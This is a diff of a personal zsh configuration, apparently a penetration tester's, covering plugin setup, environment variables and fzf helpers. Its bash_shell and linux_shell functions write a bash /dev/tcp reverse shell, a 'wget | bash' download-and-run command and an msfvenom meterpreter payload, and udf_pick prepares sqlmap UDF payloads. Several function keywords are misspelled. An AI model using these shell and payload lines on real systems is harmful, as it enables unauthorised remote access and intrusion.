@@ -74,10 +74,10 @@ id-as='z-a-patch'    zinit-zsh/z-a-patch-dl
 zinit ice depth"1" id-as='pw10k'
 zinit light romkatv/powerlevel10k
 
-zinit ice depth="1" id-as="vi-mode"
-zinit light jeffreytse/zsh-vi-mode
+# zinit ice depth="1" id-as="vi-mode"
+# zinit light jeffreytse/zsh-vi-mode
 
-zinit ice id-as="cht"  mv="%ID% -> cht.sh" sbin="cht.sh" cloneonly
+zinit ice id-as="cht" as="bin" mv="%ID% -> cht.sh" sbin="cht.sh"
 zinit snippet https://cht.sh/:cht.sh
 
 zinit  light-mode lucid wait="0"  for\
@@ -109,7 +109,6 @@ zinit  light-mode lucid wait="0"  for\
     id-as='gpg-crypt'           "Czocher/gpg-crypt" \
     id-as='git-flow-completion' "bobthecow/git-flow-completion" \
     id-as='k'                   "supercrabtree/k" \
-    id-as="msfvenom"            as="completion" mv="%ID% ->_msfvenom" "https://raw.githubusercontent.com/Green-m/msfvenom-zsh-completion/master/_msfvenom" \
     id-as='cd-reminder'         "bartboy011/cd-reminder" \
     id-as='blackbox'            "StackExchange/blackbox"\
     id-as='zsh-case'            "rtuin/zsh-case"\
@@ -117,6 +116,7 @@ zinit  light-mode lucid wait="0"  for\
     id-as='hitokoto'            "https://raw.githubusercontent.com/ohmyzsh/ohmyzsh/master/plugins/hitokoto/hitokoto.plugin.zsh"\
     id-as='copydir'             "https://raw.githubusercontent.com/ohmyzsh/ohmyzsh/master/plugins/copydir/copydir.plugin.zsh" \
 
+# id-as="msfvenom"            as="completion" mv="%ID% ->_msfvenom" "https://raw.githubusercontent.com/Green-m/msfvenom-zsh-completion/master/_msfvenom" \
 zinit ice lucid wait="0" id-as="eval.zsh"
 zinit snippet $(echo "${HOME}/.config/custom/eval.zsh")
 
@@ -127,8 +127,12 @@ zinit snippet OMZ::plugins/extract
 zinit ice lucid wait="0" id-as="bindkey"
 zinit snippet $(echo "${HOME}/.config/custom/bindkey.sh")
 
+zinit ice blockf lucid wait="0" atclone="zinit creinstall zshcompletions" id-as="rsh_zshcompletions" as="completion"
+zinit light https://github.com/rsherstnev/zshcompletions
+
 zinit ice blockf lucid wait="0" atload='zpcompinit;zpcdreplay' atclone="zinit creinstall zsh-completions" id-as="zsh-completions" as="completion"
 zinit light zsh-users/zsh-completions
+
 
 
 zinit ice wait="1" lucid id-as="autopair"
@@ -229,7 +233,7 @@ export FZF_DEFAULT_COMMAND='fd --type file --follow --hidden --exclude .git --co
 # export FZF_DEFAULT_OPTS="--ansi --preview-window 'right:60%' --preview 'batcat --color=always --style=header,grid --line-range :300 {}'"
 export FZF_DEFAULT_OPTS="--ansi"
 #}}}
-## export {{{
+## 环境变量 {{{
 export TZ='Asia/Shanghai'
 export DOTBARE_DIR="${HOME}/.myconfig"
 export DOTBARE_TREE="${HOME}"
@@ -244,6 +248,7 @@ export TARGET_HTTP_PORT="80"
 export TARGET_HTTPS_PORT="443"
 export TARGET_FQDN=""
 export LOCAL_PORT="443"
+export HOST_ROOT_PATH="${HOME}"
 export GOPATH="${HOME}/.local/go"
 export BIN="${HOME}/.local/bin"
 export TEMP=$(uuid | tr -d '-' | cut -c '1-8')
@@ -279,8 +284,13 @@ export LANG="zh_CN.UTF-8"
 PATH=${PATH}:${HOME}/.local/bin
 PATH=${PATH}:${GOPATH}/bin
 PATH=${PATH}:${HOME}/script
+ZSH_AUTOSUGGEST_BUFFER_MAX_SIZE=20
+ZSH_AUTOSUGGEST_HIGHLIGHT_STYLE='fg=8,bold,underline'
+ZSH_AUTOSUGGEST_STRATEGY=(history completion)
+ZSH_AUTOSUGGEST_HISTORY_IGNORE="clear*|echo *"
 #}}}
 ###alias {{{
+alias cl='clear'
 if [ -x "$(command -v exa)" ]; then
     alias ls="exa"
     alias la="exa --long --all --group"
@@ -386,7 +396,23 @@ function rmv() {
 }
 alias pdict=_pdict
 function _pdict(){
-    fd . "${HOME}/dict" | fzf | clipcopy
+    fd . "${HOME}/dict" | fzf | tr -d '\n' |clipcopy
+}
+fucntion hcat(){
+    file=$(fd . --full-path "${HOST_ROOT_PATH}" -t f| fzf | tr -d '\n')
+    cat $file
+
+}
+function hcd(){
+     dir=$(fd . --full-path "${HOST_ROOT_PATH}"  -t d| fzf | tr -d '\n')
+     cd $dir
+
+}
+function udf_pick(){
+    UDF_PATH=$(fd . --full-path "/usr/share/sqlmap/data/udf" -t f | fzf)
+    FILE_NAME=$(basename $UDF_PATH )
+    # echo ${FILE_NAME%?}
+    python3 $(locate cloak.py) -d -i $UDF_PATH  -o ${FILE_NAME%?}
 }
 function ef(){
     if [ $1 ];then
@@ -407,17 +433,26 @@ fucntion get_tmux(){
     name=$(tmux ls | cut -d '-' -f 1|fzf)
     tmux a -t $name
 }
-function bash_shell(){
-    echo "bash -i >& /dev/tcp/$LOCAL_IP/443 0>&1" > /tmp/temp
-    echo "wget -O -  http://$LOCAL_IP:8080/temp | bash" | clipcopy
-    cd /tmp
-    python3 -m http.server 8080
+function add_server(){
+    # read -p "enter port" port
+    # read -p "enter server" service
+    # mkdir "$port-$service"
+}
+fucntion log_start(){
+    exec > logfile 2>&1
+    set -x
+}
+functio bash_shell(){
+    echo "bash -i >& /dev/tcp/$LOCAL_IP/443 0>&1" > /tmp/temp_bash
+    echo "wget -O -  http://$LOCAL_IP:8080/temp_bash | bash" | clipcopy
 }
 function linux_shell(){
     msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=$LOCAL_IP LPORT=443 --platform linux -f elf -o /tmp/temp
     cd /tmp
     echo "wget http://$LOCAL_IP:8080/temp"
-    python3 -m http.server 8080
+}
+function wget_echo(){
+    echo "wget http://$LOCAL_IP:8080/$1" | tee | clipcopy
 }
 function ssht () {/usr/bin/ssh -t "$@" "tmux attach -s 'master' || tmux new -t 'master' ";}
 function src() {
